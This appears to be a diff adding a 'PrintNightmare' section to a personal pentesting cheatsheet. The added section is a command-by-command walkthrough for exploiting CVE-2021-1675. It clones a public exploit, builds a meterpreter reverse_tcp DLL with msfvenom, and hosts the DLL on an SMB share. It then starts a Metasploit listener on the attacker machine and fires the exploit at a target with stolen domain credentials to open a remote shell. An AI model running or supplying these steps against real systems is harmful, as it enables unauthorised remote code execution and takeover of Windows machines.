@@ -291,4 +291,36 @@ useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 
 
 
-----
+--WINDOWS HACKING PrintNightmare--
+
+> git clone https://github.com/cube0x0/CVE-2021-1675.git
+> cd CVE-2021-1675/
+> ls -la
+> pip3 uninstall impacket
+> git clone https://github.com/cube0x0/impacket
+> cd impacket
+> pip3 install .
+> python3 ./setup.py install
+> cd ..
+> pyython3 ./CVE-2021-1675.py
+open new terminal
+> cd CVE-2021-1675/
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attack_machine_ip LPORT=4444 -f dll -o shell.dll (shell.dll file will be created, remember the path too dll file)
+> cd impacket
+> cd examples
+> python3 ./smbserver.py share /home/user/CVE-2021-1675/(path to dll file) -smb2support
+smb server is started, open new terminal
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_tcp
+> set LHOST attack_machine_ip
+> set LPORT 4444
+> run
+Listener is started, let's go back to first terminal
+> python3 ./CVE-2021-1675.py domain/username:password@target_machine_ip '\\attack_machine_ip\share\shell.dll'(path to dll)
+Go back to listening terminal for meterpreter session
+
+
+
+
+------
